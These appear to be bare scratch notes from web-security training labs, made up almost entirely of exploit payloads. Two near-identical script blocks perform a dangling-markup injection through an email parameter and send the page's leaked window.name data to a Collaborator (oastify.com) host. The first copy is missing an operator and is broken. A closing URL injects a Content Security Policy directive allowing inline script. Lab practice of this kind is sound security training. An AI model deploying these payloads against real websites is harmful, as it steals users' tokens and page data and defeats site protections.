...
rni0tw0a8ybqmggreokft0i4ovunif64.oastify.com

<script>
if(window.name) {
        new Image().src='//rni0tw0a8ybqmggreokft0i4ovunif64.oastify.com?' encodeURIComponent(window.name);
        } else {
                location = 'https://0a4400d80392d3c880ea214c0006005c.web-security-academy.net/my-account?email="><a href="https://exploit-0a5700470348d3d180902055010f006c.exploit-server.net/exploit">Click me</a><base target='';
}
</script>


nh8wnsu62u5mgcan8kebnwc0irojcn0c.oastify.com

<script>
if(window.name) {
        new Image().src='//nh8wnsu62u5mgcan8kebnwc0irojcn0c.oastify.com?'+encodeURIComponent(window.name);
        } else {
                location = 'https://0a4400d80392d3c880ea214c0006005c.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a5700470348d3d180902055010f006c.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>

```

https://0aeb00b703e830ee8020a83700ba0038.web-security-academy.net/?search=REXX&token=test;%20script-src-elem%20%27unsafe-inline%27